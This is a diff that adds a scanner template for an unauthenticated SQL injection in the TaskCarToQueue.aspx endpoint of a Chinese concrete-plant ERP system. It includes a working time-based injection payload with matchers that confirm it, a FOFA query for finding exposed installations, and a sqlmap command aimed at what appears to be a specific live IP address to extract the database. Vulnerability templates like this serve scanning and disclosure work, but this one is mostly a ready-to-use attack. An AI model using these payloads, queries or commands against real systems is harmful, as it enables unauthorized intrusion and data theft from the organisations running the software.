@@ -1,0 +1,32 @@
+id: shanghun-TaskCarToQueue-sqli
+info:
+  name: 商混 ERP TaskCarToQueue.aspx sqli
+  author: leadlife
+  severity: high
+  description: 商混ERP系统 TaskCarToQueue.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%95%86%E6%B7%B7ERP/%E5%95%86%E6%B7%B7ERP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3TaskCarToQueue.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: title="商混ERP系统"
+    sqlmap: sqlmap -u "http://122.225.196.22:8570/Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%1" -p id --batch --random-agent --dbms="Microsoft SQL Server"
+  tags: shanghun,sqli,hntxrj,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+              
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
